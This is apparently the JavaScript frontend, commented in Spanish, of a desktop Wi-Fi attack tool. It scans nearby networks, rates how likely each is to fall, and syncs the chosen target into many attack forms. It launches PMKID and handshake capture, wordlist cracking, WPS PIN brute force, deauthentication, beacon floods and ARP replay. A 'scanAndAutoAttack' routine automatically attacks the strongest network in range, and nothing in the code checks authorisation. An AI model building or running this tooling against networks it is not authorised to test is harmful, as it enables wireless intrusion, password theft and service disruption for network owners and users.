import { invoke } from '@tauri-apps/api/core';
import { listen } from '@tauri-apps/api/event';

// ── State ────────────────────────────────────────────────────────────────
let activeTab = 'scan';
let logLines  = [];

// ── helpers ──────────────────────────────────────────────────────────────
const $  = id => document.getElementById(id);
const esc = s => String(s)
  .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
window.esc = esc;

function el(tag, cls, html) {
  const e = document.createElement(tag);
  if (cls) e.className = cls;
  if (html !== undefined) e.innerHTML = html;
  return e;
}

// RENDIMIENTO (3 niveles de defensa; bug real: «lanzo ataque → voy a Consola →
// ya no puedo volver»):
//  1) Nada de `textContent +=` (recopia TODO el texto en cada línea): un nodo
//     por entrada + cap estricto de nodos en el DOM.
//  2) El pintado se agrupa por frame (requestAnimationFrame): una ráfaga de 500
//     líneas cuesta UN lote de nodos y UN scroll, no 500 de cada uno.
//  3) Si el tab Consola está OCULTO no se toca el DOM: solo se guarda el
//     historial y se reconstruye al abrir el tab. Antes cada evento de un ataque
//     en marcha pintaba en un panel invisible y el hilo de UI se saturaba, así
//     que los clics del sidebar dejaban de responder (no se podía volver).
const LOG_MAX_LINES = 500;   // historial y nodos máximos en #cv
const LOG_PAINT_MAX = 200;   // entradas incrementales máximas por frame
const LOG_COLORS = { error: '#f07178', warn: '#e6b455', ok: '#7dcf8e' };

let _logHist = [];           // [{ line, level }] — historial (fuente del redibujado)
let _logPending = [];        // entradas pendientes de pintar en #cv
let _logFlushQueued = false;
let _cvDirty = false;        // hay historial sin pintar en #cv

const _scrollQueued = new Set();
function queueScroll(elm) {
  if (!elm || _scrollQueued.has(elm)) return;
  _scrollQueued.add(elm);
  const flush = () => {
    _scrollQueued.delete(elm);
    try { elm.scrollTop = elm.scrollHeight; } catch { /* noop */ }
  };
  if (typeof requestAnimationFrame === 'function') requestAnimationFrame(flush);
  else setTimeout(flush, 100);
}

// Reconstruye #cv completo desde el historial (una sola pasada de DOM).
function _renderConsoleTail() {
  const cv = $('cv');
  _logPending.length = 0;
  _cvDirty = false;
  if (!cv) return;
  const frag = document.createDocumentFragment();
  for (const e of _logHist) {
    const div = document.createElement('div');
    div.textContent = e.line;
    if (LOG_COLORS[e.level]) div.style.color = LOG_COLORS[e.level];
    frag.appendChild(div);
  }
  cv.textContent = '';
  cv.appendChild(frag);
  queueScroll(cv);
}

function _paintConsole() {
  const cv = $('cv');
  if (!cv) { _logPending.length = 0; return; }
  if (!$('tab-console')?.classList.contains('active')) {
    // Consola oculta: cero trabajo de layout; se redibuja al abrir el tab.
    if (_logPending.length) { _logPending.length = 0; _cvDirty = true; }
    return;
  }
  if (_logPending.length > LOG_PAINT_MAX) {
    // Ráfaga muy grande: redibujado completo (más barato que 1000 appendChild).
    _logPending.length = 0;
    _cvDirty = true;
  }
  if (_cvDirty) { _renderConsoleTail(); return; }
  if (_logPending.length) {
    const frag = document.createDocumentFragment();
    for (const e of _logPending.splice(0)) {
      const div = document.createElement('div');
      div.textContent = e.line;
      if (LOG_COLORS[e.level]) div.style.color = LOG_COLORS[e.level];
      frag.appendChild(div);
    }
    cv.appendChild(frag);
    while (cv.childNodes.length > LOG_MAX_LINES) cv.removeChild(cv.firstChild);
    queueScroll(cv);
  }
}

function _flushLog() {
  _logFlushQueued = false;
  _paintConsole();
  const mini = $('mini-cv');
  if (mini && logLines.length && $('tab-scan')?.classList.contains('active')) {
    mini.textContent = logLines.slice(-3).join('\n');
    queueScroll(mini);
  }
}
function _queueLogFlush() {
  if (_logFlushQueued) return;
  _logFlushQueued = true;
  if (typeof requestAnimationFrame === 'function') requestAnimationFrame(_flushLog);
  else setTimeout(_flushLog, 100);
}

function log(msg, level = 'info') {
  const now = new Date().toLocaleTimeString('es-ES', { hour12: false });
  const line = `[${now}] [${level.toUpperCase()}] ${msg}`;
  logLines.push(line);
  if (logLines.length > LOG_MAX_LINES) logLines.splice(0, logLines.length - LOG_MAX_LINES);
  _logHist.push({ line, level });
  if (_logHist.length > LOG_MAX_LINES) _logHist.splice(0, _logHist.length - LOG_MAX_LINES);
  _logPending.push({ line, level });
  if (_logPending.length > LOG_MAX_LINES) _logPending.splice(0, _logPending.length - LOG_MAX_LINES);
  _queueLogFlush();
  console.log(line);
}
window.log = log;
window.__flushLog = _flushLog;
window.__renderConsoleTail = _renderConsoleTail;

// Captura global de errores: cualquier excepción no manejada queda en la consola
// de la UI en vez de romper en silencio el clic de tabs/botones.
window.addEventListener('error', (ev) => {
  try { log(`JS error: ${ev.message} @ ${ev.filename?.split('/').pop()}:${ev.lineno}`, 'error'); } catch { /* noop */ }
});
window.addEventListener('unhandledrejection', (ev) => {
  try { log(`Promise rechazada: ${ev.reason}`, 'error'); } catch { /* noop */ }
});

window.clearConsole = function clearConsole() {
  logLines = [];
  _logHist = [];
  _logPending = [];
  _cvDirty = false;
  const cv = $('cv');
  if (cv) cv.textContent = '';
  const mini = $('mini-cv');
  if (mini) mini.textContent = '';
};

// Mini consola del tab Escanear: plegable para recuperar altura útil de la tabla
// (en ventanas bajas la tabla se quedaba en 2-3 filas visibles).
window.toggleMiniConsole = function () {
  const wrap = $('mini-wrap');
  const btn = $('mini-toggle');
  if (!wrap) return;
  const collapsed = wrap.classList.toggle('collapsed');
  if (btn) btn.innerHTML = collapsed ? '&#9654;' : '&#9660;';
  if (btn) btn.title = collapsed ? 'Mostrar salida rápida' : 'Ocultar salida rápida';
  if (!collapsed) {
    const mini = $('mini-cv');
    if (mini) queueScroll(mini);
  }
};

// ── Row selection ────────────────────────────────────────────────────────────
window.selectNetwork = function (bssid, ssid, signal, channel, security) {
  if (!bssid) { log('Red sin BSSID, no se puede seleccionar.', 'warn'); return; }

  const bar = document.getElementById('scan-attack-bar');
  const sabSsid = document.getElementById('sab-ssid');
  const sabMeta = document.getElementById('sab-meta');
  if (bar) bar.style.display = 'flex';
  if (sabSsid) sabSsid.textContent = `${ssid || 'Red oculta'}`;
  if (sabMeta) sabMeta.textContent = `${bssid} · ${signal}% · CH ${channel} · ${security}`;

  const attackBssid = document.getElementById('attack-bssid');
  if (attackBssid) {
    const opt = Array.from(attackBssid.options).find(o => o.value === bssid);
    if (opt) opt.selected = true;
  }

  document.querySelectorAll('#net-tbody tr').forEach(r => r.classList.remove('selected'));
  try {
    const row = document.querySelector(`#net-tbody tr[data-bssid="${CSS.escape(bssid)}"]`);
    if (row) row.classList.add('selected');
  } catch (e) {
    log(`selectNetwork: error resaltando fila: ${e}`, 'error');
  }

  log(`Seleccionada: ${ssid || 'Red oculta'} (${bssid}) · ${signal}% · CH ${channel}`, 'info');

  const autoBssid = document.getElementById('auto-bssid');
  if (autoBssid) autoBssid.value = bssid;

  syncTargetEverywhere(bssid, ssid, channel);
  profileTarget(bssid);

  window.showTab('attack');
};

// ── Sincroniza el objetivo seleccionado a TODAS las tarjetas de ataque ────
// Al elegir una red (fila del scan o dropdown), BSSID/SSID/canal se copian a
// keygen, WPS, deauth, fakeauth, ARP, chopchop, frag, latte, rogue, airodump,
// WSL y connect. Nada de rellenar a mano ni pulsar «Usar objetivo» una a una.
window.syncTargetEverywhere = function (bssid, ssid, channel) {
  const ch = parseInt(channel);
  let filled = 0;
  const setB = id => { const el = $(id); if (el) { el.value = bssid || ''; filled++; } };
  const setS = id => { const el = $(id); if (el) { el.value = ssid; filled++; } };
  // Respeta min/max del input (p. ej. wsl-chan solo 2.4 GHz 1-14).
  const setCh = id => {
    const el = $(id); if (!el || !(ch >= 1)) return;
    const min = parseInt(el.min), max = parseInt(el.max);
    if (!isNaN(min) && ch < min) return;
    if (!isNaN(max) && ch > max) return;
    el.value = ch; filled++;
  };

  // BSSID en todas las tarjetas que lo piden
  ['fakeauth-bssid','deauth-bssid','arpreply-bssid','chopchop-bssid','frag-bssid',
   'latte-bssid','wpspbc-bssid','pixie-bssid','rogue-bssid','airodump-bssid',
   'wsl-bssid','keygen-bssid','wpa3-bssid',
  ].forEach(setB);

  // SSID donde aplica (solo si la red no está oculta)
  if (ssid) {
    ['keygen-ssid','conn-ssid','et-ssid','wpa3-ssid','handshake-essid','rogue-essid'].forEach(setS);
  }

  // Canal del AP objetivo (la radio Windows no salta de canal: operar en el suyo)
  ['pmkid-chan','handshake-chan','wps-chan','wpspbc-chan','pixie-chan','wash-chan',
   'et-chan','wpa3-chan','rogue-chan','beacon-chan','wsl-chan','airodump-chan',
  ].forEach(setCh);

  log(`Objetivo sincronizado en ${filled} campos de ataque (BSSID${ssid ? ' + SSID' : ''}${ch >= 1 ? ' + CH' + ch : ''}).`, 'info');
};

// Cambio en el dropdown de objetivo del tab de ataque: sincroniza todo + perfila.
window.onTargetChange = function () {
  const v = $('attack-bssid')?.value;
  if (!v) return;
  const n = lastNets.find(x => (x.bssid || '').toUpperCase() === v.toUpperCase());
  syncTargetEverywhere(v, n?.ssid, n?.channel);
  profileTarget(v);
};

// ── Perfilador de objetivo (solo lectura) ─────────────────────────────────
const VERDICT_COLORS = {
  open: 'var(--green)', wep: 'var(--yellow)', wpa_legacy: 'var(--yellow)',
  wpa2_psk: 'var(--accent)', transition: 'var(--orange)', wpa3_sae: 'var(--red)',
  enterprise: 'var(--gray)', unknown: 'var(--gray)',
};
const BADGE_LABELS = {
  'windows-ok': '✓ Windows', 'linux-required': '⚠ requiere Linux',
  'exito-alto': 'éxito alto', 'exito-medio': 'éxito medio',
  'exito-bajo': 'éxito bajo', 'exito-nulo': 'sin vía',
};

async function profileTarget(bssid) {
  const box = document.getElementById('target-verdict');
  if (!bssid) { if (box) box.style.display = 'none'; return; }
  try {
    const p = await window.__invoke('profile_target', { bssid });
    window._profile = p;
    renderProfile(p);
  } catch (e) {
    log(`Perfilador: ${e}`, 'warn');
    if (box) box.style.display = 'none';
  }
}
window.profileTarget = profileTarget;

function renderProfile(p) {
  const box = document.getElementById('target-verdict');
  if (!box || !p) return;
  const color = VERDICT_COLORS[p.verdict] || 'var(--gray)';
  box.style.display = 'block';
  box.style.borderColor = color;
  document.getElementById('verdict-title').textContent = p.title;
  document.getElementById('verdict-title').style.color = color;
  document.getElementById('verdict-detail').textContent = p.detail;
  document.getElementById('verdict-meta').textContent =
    `${p.ssid} · ${p.bssid} · ${p.auth}/${p.cipher} · CH ${p.channel ?? '?'} · ${p.signal ?? '?'}% · WPS:${p.wps} · MFP:${p.mfp}`;
  const badges = document.getElementById('verdict-badges');
  badges.innerHTML = (p.badges || []).map(b =>
    `<span style="font-size:10.5px;font-weight:600;border:1px solid ${color}55;color:${color};border-radius:99px;padding:2px 10px">${esc(BADGE_LABELS[b] || b)}</span>`
  ).join('');
}

// ── Tabs ─────────────────────────────────────────────────────────────────
// Delegación en el sidebar: un único listener para todos los nav-btn, a prueba
// de escapes de Vite en `onclick` inline y de que un botón pierda su atributo.
// showTab es idempotente, así que el onclick inline de respaldo no molesta.
document.querySelector('.sidebar')?.addEventListener('click', (ev) => {
  const btn = ev.target instanceof Element ? ev.target.closest('.nav-btn') : null;
  if (!btn || !btn.id) return;
  try { window.showTab(btn.id.replace(/^nav-/, '')); }
  catch (e) { console.error('tab click:', e); }
});

window.showTab = function (id) {
  try {
    const tab = $(`tab-${id}`);
    const nav = $(`nav-${id}`);
    if (!tab || !nav) { log(`showTab: pestaña desconocida '${id}'`, 'error'); return; }
    if (activeTab === id && tab.classList.contains('active')) return; // ya estamos aquí
    document.querySelectorAll('.tab.active').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.nav-btn.active').forEach(b => b.classList.remove('active'));
    tab.classList.add('active');
    nav.classList.add('active');
    activeTab = id;
    // Un único refresco por cambio de tab (no por evento de ataque):
    //  · Consola → redibuja el historial acumulado mientras estaba oculta.
    //  · Escanear → refresca la salida rápida y su scroll.
    //  · Ataque  → vuelca la salida viva acumulada mientras no se veía.
    if (id === 'console') {
      _renderConsoleTail();
    } else if (id === 'scan') {
      const mini = $('mini-cv');
      if (mini) { mini.textContent = logLines.slice(-3).join('\n'); queueScroll(mini); }
      // FAIL-SAFE del lock: si un ataque murió sin emitir attack-completed
      // (crash del proceso, kill externo…), el lock quedaría puesto para siempre
      // y el Escanear deshabilitado. Al volver al tab Escanear, si el backend no
      // tiene procesos vivos, libera el lock automáticamente.
      if (attackIsBusy()) {
        window.__invoke('list_attack_processes').then(r => {
          const out = (r?.output || '') + ' ' + (r?.stderr || '');
          const vivos = /PID|\d{3,}/.test(out) && !/no hay|none|0 procesos|no running/i.test(out);
          if (!vivos && !window._autoStop) {
            log('Lock de ataque liberado automáticamente (no quedan procesos vivos).', 'info');
            setAttackRunning(false);
            currentAttackId = null;
          }
        }).catch(() => {});
      }
    } else if (id === 'attack') {
      _flushLive();
      // Veredicto de hardware informativo (sin gating: nada se bloquea).
      if (window.applyHardwareGates) window.applyHardwareGates();
    }
    _flushLog();
  } catch (e) {
    log(`showTab error: ${e}`, 'error');
  }
};

// ── Render rows ───────────────────────────────────────────────────────────
function sigChars(sig) {
  const c = Math.max(0, Math.min(100, sig));
  return c >= 75 ? '▂▄▆█'
       : c >= 50 ? '▂▄▆'
       : c >= 25 ? '▂▄'
       : '▁';
}

function sigColor(sig) {
  const c = Math.max(0, Math.min(100, sig));
  return `hsl(140, 70%, ${18 + c * 0.37}%)`;
}

function secColor(sec) {
  if (!sec || /abierta|open/i.test(sec)) return 'var(--gray)';
  return 'var(--accent)';
}

function rowsHtml(nets) {
  if (!nets.length) {
    return `
      <tr class="empty-row">
        <td colspan="6">
          <div class="empty-state">
            <span class="ei">&#128247;</span>
            <p>No se encontraron redes en este escaneo.</p>
          </div>
        </td>
      </tr>`;
  }

  return nets.map((n, i) => `
    <tr style="cursor:pointer"
        data-bssid="${esc(n.bssid || '')}"
        data-ssid="${esc(n.ssid)}"
        data-signal="${n.signal ?? 0}"
        data-channel="${n.channel ?? 0}"
        data-security="${esc(n.security || 'Abierta')}"
        data-index="${i}">
      <td class="td-bar" style="color:${sigColor(n.signal)}">${sigChars(n.signal)}</td>
      <td class="td-ssid" title="${esc(n.ssid)}">${esc(n.ssid)}</td>
      <td class="td-num" style="color:${sigColor(n.signal)};text-align:right">${n.signal}%</td>
      <td class="td-num" style="color:var(--muted);text-align:right">${n.channel ?? '–'}</td>
      <td><span class="sec-badge"
               style="background:${secColor(n.security)}22;color:${secColor(n.security)};
                      border:1px solid ${secColor(n.security)}55;padding:3px 10px;
                      border-radius:99px;font-size:11px;font-weight:600">
              ${esc(n.security || 'Abierta')}
            </span></td>
      <td class="td-bssid">${esc(n.bssid || '—')}</td>
    </tr>
  `).join('');
}

// ── Scan handler ──────────────────────────────────────────────────────────
window.doScan = async function () {
  const btn = $('scanBtn');
  btn.disabled = true;
  btn.textContent = 'Escaneando…';
  $('status-txt').textContent = 'Escaneando…';
  $('count-pill').style.display = 'none';
  log('Comando scan_wifi enviado al proceso Rust…', 'info');

  const t0 = performance.now();

  try {
    const result = await window.__invoke('scan_wifi');
    const ms = Math.round(performance.now() - t0);

    if (result?.error) {
      log(`ERROR: ${result.error}`, 'error');
      renderHeader(`Error · ${result.error}`);
      renderRows([]);
      $('status-txt').textContent = 'Error';
      return;
    }

    const nets = result?.networks || [];
    lastNets = [...nets];   // guarda para el panel de ataque
    syncTargetList();       // refresca el selector BSSID
    log(`Escaneo completado en ${ms} ms · ${nets.length} redes encontradas`, 'info');
    renderHeader(`${ms} ms · ${nets.length} red${nets.length === 1 ? '' : 'es'} encontrada${nets.length === 1 ? '' : 's'}`);
    renderRows(nets);
    $('status-txt').textContent = 'Listo';
    $('count-pill').style.display = 'inline';
  } catch (err) {
    const msg = String(err);
    log(`FATAL: ${msg}`, 'error');
    renderHeader('Error de conexión');
    renderRows([]);
  } finally {
    btn.disabled = false;
    // innerHTML (no textContent): la entidad &#x1F50D; debe parsearse como 🔍.
    btn.innerHTML = '&#x1F50D; Escanear ahora';
  }
};

function renderHeader(text) {
  let pill = $('count-pill');
  if (!pill) return;
  pill.textContent = text;
  pill.style.display = 'inline';
}

function renderRows(nets) {
  $('net-tbody').innerHTML = rowsHtml(nets);
}

// Event delegation for row clicks (evita escapes rotos en onclick)
document.getElementById('net-tbody')?.addEventListener('click', function (e) {
  try {
    const tr = e.target.closest('tr');
    if (!tr || !tr.dataset.bssid) return;
    const bssid    = tr.dataset.bssid;
    const ssid     = tr.dataset.ssid || 'Red oculta';
    const signal   = parseInt(tr.dataset.signal) || 0;
    const channel  = parseInt(tr.dataset.channel) || 0;
    const security = tr.dataset.security || 'Abierta';
    selectNetwork(bssid, ssid, signal, channel, security);
  } catch (e) {
    log(`Error al seleccionar red: ${e}`, 'error');
  }
});

// ── Attack helpers: state & select ──────────────────────────────────────────
let lastNets = []; // last scan result — feeds attack BSSID dropdown

window.syncTargetList = function () {
  const sel = $('attack-bssid');
  if (!sel) return;
  sel.innerHTML = '<option value="">-- Selecciona una red de la lista --</option>';
  lastNets.forEach(n => {
    const opt   = document.createElement('option');
    opt.value   = n.bssid || '';
    opt.textContent = `${n.ssid}  ·  ${n.bssid || 'sin bssid'}  ·  ${n.security}`;
    sel.appendChild(opt);
  });
};

function getSelectedBssid() {
  const bssid = $('attack-bssid')?.value?.trim();
  if (!bssid) { log('Selecciona un objetivo BSSID en el panel Ataque primero.', 'warn'); return null; }
  return bssid;
}

function valOrEmpty(v) { return String(v ?? '').trim(); }

// SSID del objetivo seleccionado (del último scan). Los inputs SSID de las
// tarjetas se rellenan en selectNetwork, pero aquí no dependemos de eso.
function targetSsid() {
  try {
    const bssid = $('attack-bssid')?.value?.trim();
    if (!bssid) return undefined;
    const n = lastNets.find(x => (x.bssid || '').toUpperCase() === bssid.toUpperCase());
    const s = n?.ssid;
    return (s && !/oculta/i.test(s)) ? s : undefined;
  } catch (e) { return undefined; }
}

// Canal del objetivo seleccionado (del último scan). Como la radio Windows no
// salta de canal, los ataques deben lanzarse en el canal donde ya está el AP.
function selectedChannel() {
  try {
    const bssid = $('attack-bssid')?.value?.trim();
    if (!bssid) return undefined;
    const n = (typeof lastNets !== 'undefined' ? lastNets : []).find(
      x => (x.bssid || '').toUpperCase() === bssid.toUpperCase());
    const ch = n ? parseInt(n.channel) : NaN;
    if (ch >= 1 && ch <= 165) {
      log(`Canal objetivo auto: CH${ch} (del scan).`, 'info');
      return ch;
    }
  } catch (e) { /* sin scan: manual */ }
  return undefined;
}
window.selectedChannel = selectedChannel; // usado también por el JS inline de index.html

function autoSelectStrongest() {
  if (!lastNets.length) {
    log('Primero escanea redes para seleccionar automáticamente el objetivo más fuerte.', 'warn');
    return null;
  }
  const strongest = lastNets.reduce((a, b) => (a.signal ?? -1) > (b.signal ?? -1) ? a : b);
  const sel = document.getElementById('attack-bssid');
  if (sel) {
    sel.value = strongest.bssid || '';
    log(`Objetivo auto-seleccionado: ${strongest.ssid || 'Red oculta'} (${strongest.bssid}) · ${strongest.signal}% · CH${strongest.channel || '?'} · ${strongest.security}`, 'ok');
    window.syncTargetEverywhere(strongest.bssid, strongest.ssid, strongest.channel);
  }
  return strongest.bssid || null;
}

window.scanAndAutoAttack = async function () {
  const btn = document.getElementById('scanBtn');
  if (btn) { btn.disabled = true; btn.textContent = 'Escaneando…'; }
  log('Escaneo automático previo al auto-ataque…', 'warn');
  try {
    const result = await window.__invoke('scan_wifi');
    const nets = result?.networks || [];
    lastNets = [...nets];
    syncTargetList();
    renderHeader(`${nets.length} redes encontradas`);
    renderRows(nets);
    if (!nets.length) {
      log('No se encontraron redes. No se puede iniciar auto-ataque.', 'warn');
      return;
    }
    const bssid = autoSelectStrongest();
    if (!bssid) return;
    await window.startAutoAttack();
  } catch (err) {
    log('Scan & Auto-Attack error: ' + err, 'error');
  } finally {
    const btn = document.getElementById('scanBtn');
    if (btn) { btn.disabled = false; btn.innerHTML = '&#x1F50D; Escanear ahora'; }
  }
};

// ── Lock de UI durante un ataque ──────────────────────────────────────────
// Mientras hay un ataque en curso (bg o síncrono) todos los botones .atk-btn
// del tab Ataque se deshabilitan salvo el de parada; así no hay duda de si
// «está atacando» y no se pueden lanzar dos procesos RF a la vez.
let _attackBusy = false;
const ATTACK_BTN_SEL = '#tab-attack .atk-btn';

function setAttackRunning(on, label) {
  _attackBusy = !!on;
  const tab = document.getElementById('tab-attack');
  if (tab) tab.classList.toggle('attack-running', _attackBusy);
  document.querySelectorAll(ATTACK_BTN_SEL).forEach(b => { b.disabled = _attackBusy; });
  // El botón de parada queda SIEMPRE operativo mientras hay ataque.
  document.querySelectorAll('#tab-attack .atk-stop').forEach(b => { b.disabled = false; });
  const status = document.getElementById('attack-status-bar');
  if (status) {
    status.style.display = _attackBusy ? 'flex' : 'none';
    if (_attackBusy) {
      const lbl = document.getElementById('attack-status-label');
      if (lbl) lbl.textContent = label || 'Ataque en curso…';
    }
  }
  const scanBtn = document.getElementById('scanBtn');
  if (scanBtn) scanBtn.disabled = _attackBusy;
}
function attackIsBusy() { return _attackBusy; }

// ── Attack invocations ──────────────────────────────────────────────────────
window.capturePmkid = async function () {
  const bssid = getSelectedBssid(); if (!bssid) return;
  const chRaw = valOrEmpty($('pmkid-chan').value);
  const ch    = chRaw ? parseInt(chRaw) : selectedChannel();
  const iface = valOrEmpty($('pmkid-iface').value) || undefined;
  const dur   = $('pmkid-dur').value ? parseInt($('pmkid-dur').value) : 120;
  currentAttackId = `pmkid_${bssid.replace(/:/g,'')}`;
  showProgress(true);
  updateProgress(10, 'Iniciando PMKID capture...');
  return invokeAttack('pmkid_capture_bg', { bssid, channel: ch, durationSeconds: dur, iface });
};

window.captureNative = async function () {
  const iface = valOrEmpty($('pmkid-iface').value) || undefined;
  const dur = $('pmkid-dur').value ? parseInt($('pmkid-dur').value) : 30;
  if (!iface) { log('Indica el GUID NPF_{…} en Interfaz (modal «Activar modo monitor»).', 'warn'); return; }
  log(`>>> Rust invoke → native_capture (bloquea ~${dur}s, modo monitor requerido)…`, 'info');
  try {
    const r = await window.__invoke('native_capture', { ifaceGuid: iface, durationSecs: dur });
    log(r.message || JSON.stringify(r), r.success ? 'ok' : 'error');
    if (r.success && r.output_file) {
      log(`Convierte con: pcap_to_22000 ← ${r.output_file}`, 'info');
      const conv = $('convert-native-pcap');
      if (conv) conv.value = r.output_file;
    }
  } catch (err) {
    log(`[FATAL native_capture] ${err}`, 'error');
  }
};

window.convertPmkid = async function () {
  const pcap = valOrEmpty($('convert-pcap').value);
  if (!pcap) { log('Especifica el archivo .pcapng a convertir.', 'warn'); return; }
  return invokeAttack('pmkid_convert', { pcapngPath: pcap, outputDir: undefined });
};

window.convertPmkidNative = async function () {
  const pcap = valOrEmpty($('convert-native-pcap').value);
  const out  = valOrEmpty($('convert-native-outdir').value) || undefined;
  if (!pcap) { log('Especifica el archivo .pcapng a convertir (nativo).', 'warn'); return; }
  return invokeAttack('pcap_to_22000', { pcapPath: pcap, outputDir: out || undefined });
};

window.crackPmkid = async function () {
  const hash = valOrEmpty($('crack-hash').value);
  const wl   = valOrEmpty($('crack-wordlist').value);
  if (!hash) { log('Especifica el archivo .22000 a crackear.', 'warn'); return; }
  return invokeAttack('pmkid_crack', {
    hashFile: hash,
    wordlist:  wl || undefined,
    attackMode: undefined,
  });
};

window.wpsBrute = async function () {
  const bssid = getSelectedBssid(); if (!bssid) return;
  const iface = valOrEmpty($('wps-iface').value) || 'wlan0';
  const toolEl = $('wps-tool');
  const tool = (toolEl && valOrEmpty(toolEl.value)) || 'auto';
  const chEl = $('wps-chan');
  const chRaw = (chEl && valOrEmpty(chEl.value)) || '';
  const ch = chRaw ? parseInt(chRaw) : selectedChannel();
  if (tool === 'bully') {
    try {
      const c = await window.__invoke('check_tool', { name: 'bully.exe' });
      if (!c.success) { log('bully.exe no encontrado (opcional). Fallback a reaver.exe.', 'warn'); }
    } catch (e) { log('check bully: ' + e, 'warn'); }
  }
  showProgress(true);
  if (tool === 'wsl') {
    updateProgress(10, 'Iniciando WPS bruteforce en Kali-WSL2 (reaver)...');
    currentAttackId = `wpswsl_${bssid.replace(/:/g,'')}`;
    try {
      const r = await window.__invoke('wsl_reaver', { iface: 'wlan0', bssid, channel: ch || 11, durationSecs: 60, pixie: false });
      if (r.stdout) log(r.stdout, 'ok');
      if (r.stderr) log(r.stderr, r.success ? 'info' : 'warn');
      log(`[Kali reaver ${r.success ? 'OK' : 'ERROR'}] ${r.message}`, r.success ? 'ok' : 'error');
    } catch (e) { log('[Kali reaver] FATAL: ' + e, 'error'); }
    showProgress(false);
    return;
  }
  updateProgress(10, 'Iniciando WPS bruteforce (reaver por defecto, bully opcional)...');
  if (tool === 'reaver' || tool === 'auto') {
    currentAttackId = `wpsr_${bssid.replace(/:/g,'')}`;
    return invokeAttack('wps_bruteforce_reaver_bg', { bssid, iface, channel: ch });
  }
  currentAttackId = `wps_${bssid.replace(/:/g,'')}`;
  return invokeAttack('wps_pin_bruteforce_bg', { bssid, interface: iface, channel: ch });
};

window.doWashScan = async function () {
  const ifaceEl = $('wash-iface') || $('wps-iface');
  const iface = (ifaceEl && valOrEmpty(ifaceEl.value)) || 'wlan0';
  const chEl = $('wash-chan');
  const chRaw = (chEl && valOrEmpty(chEl.value)) || '';
  const ch = chRaw ? parseInt(chRaw) : undefined;
  currentAttackId = 'wash_scan';
  showProgress(true);
  updateProgress(10, 'Wash scan WPS...');
  try {
    const r = await window.__invoke('wash_scan', { iface, channel: ch });
    const n = (r.entries && r.entries.length) || 0;
    log('Wash: ' + n + ' redes WPS.', 'ok');
    (r.entries || []).forEach(function(e) { log(' ' + e.bssid + ' CH' + (e.channel || '?') + ' ' + (e.wpsLocked ? 'LOCKED' : 'open') + ' ' + (e.essid || ''), e.wpsLocked ? 'warn' : 'info'); });
    log(r.output, 'output');
  } catch (e) { log('Wash ERROR: ' + e, 'error'); }
};

window.captureHandshake = async function () {
  const bssid = getSelectedBssid(); if (!bssid) return;
  const essid = valOrEmpty($('handshake-essid').value) || undefined;
  const chRaw = valOrEmpty($('handshake-chan').value);
  const ch    = chRaw ? parseInt(chRaw) : selectedChannel();
  const iface = valOrEmpty($('handshake-iface').value) || undefined;
  const dur   = $('handshake-dur').value ? parseInt($('handshake-dur').value) : 60;
  currentAttackId = `handshake_${bssid.replace(/:/g,'')}`;
  showProgress(true);
  updateProgress(10, 'Iniciando handshake capture...');
  return invokeAttack('capture_handshake_bg', { bssid, essid, channel: ch, durationSeconds: dur, iface });
};

window.crackHandshake = async function () {
  const hash  = valOrEmpty($('crack-handshake-hash').value);
  const wl    = valOrEmpty($('crack-handshake-wordlist').value);
  const atk   = valOrEmpty($('crack-handshake-mode').value) || '0';
  const sess  = valOrEmpty($('crack-handshake-session').value) || undefined;
  if (!hash) { log('Especifica el archivo .hccapx o .22000 a crackear.', 'warn'); return; }
  return invokeAttack('crack_handshake', {
    hashFile: hash,
    wordlist:  wl || undefined,
    attackMode: parseInt(atk) || undefined,
    sessionName: sess || undefined,
  });
};

window.doDeauth = async function () {
  const bssid  = valOrEmpty($('deauth-bssid').value);
  const client = valOrEmpty($('deauth-client').value) || undefined;
  const cnt    = valOrEmpty($('deauth-count').value) || '10';
  const iface  = valOrEmpty($('deauth-iface').value) || 'wlan0mon';

  if (!bssid) { log('Especifica el BSSID del AP objetivo.', 'warn'); return; }
  log(`Deauth: AP=${bssid} client=${client || 'broadcast'} cnt=${cnt} iface=${iface}`, 'warn');
  showProgress(true);
  return invokeAttack('deauth_inject', { bssid, clientMac: client, count: parseInt(cnt) || 10, iface });
};

window.doDisassoc = async function () {
  const bssid  = valOrEmpty($('deauth-bssid').value);
  const client = valOrEmpty($('deauth-client').value) || undefined;
  const cnt    = valOrEmpty($('deauth-count').value) || '5';
  const iface  = valOrEmpty($('deauth-iface').value) || 'wlan0mon';

  if (!bssid) { log('Especifica el BSSID del AP objetivo.', 'warn'); return; }
  log(`Disassoc: AP=${bssid} client=${client || 'broadcast'} cnt=${cnt} iface=${iface}`, 'warn');
  showProgress(true);
  return invokeAttack('disassoc_inject', { bssid, clientMac: client, count: parseInt(cnt) || 5, iface });
};

window.doBeaconFlood = async function () {
  const essid = valOrEmpty($('beacon-essid').value);
  const ch    = valOrEmpty($('beacon-chan').value) || '1';
  const cnt   = valOrEmpty($('beacon-count').value) || '50';
  const iface = valOrEmpty($('beacon-iface').value) || undefined;
  if (!essid) { log('Especifica un ESSID para el beacon flood.', 'warn'); return; }
  log(`Beacon flood: ESSID=${essid} chan=${ch} beacons=${cnt} iface=${iface || 'auto'}`, 'warn');
  showProgress(true);
  return invokeAttack('beacon_flood', { essid, bssid: undefined, channel: parseInt(ch) || 1, beaconCount: parseInt(cnt) || 50, iface });
};

window.doAirodumpScan = async function () {
  const chRaw   = valOrEmpty($('airodump-chan').value);
  const ch      = chRaw ? parseInt(chRaw) : 0;
  const dur     = valOrEmpty($('airodump-dur').value) ? parseInt($('airodump-dur').value) : 60;
  const bssid   = valOrEmpty($('airodump-bssid').value) || undefined;
  const iface   = valOrEmpty($('airodump-iface').value) || undefined;
  log(`airodump: ch=${ch || 'todos'} dur=${dur}s bssid=${bssid || 'ninguno'} iface=${iface || 'auto'}`, 'info');
  currentAttackId = 'airodump_scan';
  showProgress(true);
  updateProgress(10, 'Iniciando escaneo airodump...');
  return invokeAttack('scan_airodump_bg', { bssidFilter: bssid, channelFilter: ch || undefined, durationSecs: dur, iface });
};

window.doArpreply = async function () {
  const bssid = valOrEmpty($('arpreply-bssid').value);
  const mac   = valOrEmpty($('arpreply-mac').value) || 'ff:ff:ff:ff:ff:ff';
  const iface = valOrEmpty($('arpreply-iface').value) || 'wlan0mon';
  if (!bssid) { log('Especifica el BSSID del AP objetivo.', 'warn'); return; }
  log(`ARP Replay: AP=${bssid} mac=${mac} iface=${iface}`, 'warn');
  showProgress(true);
  return invokeAttack('arp_replay_inject', { targetBssid: bssid, address: mac, iface });
};

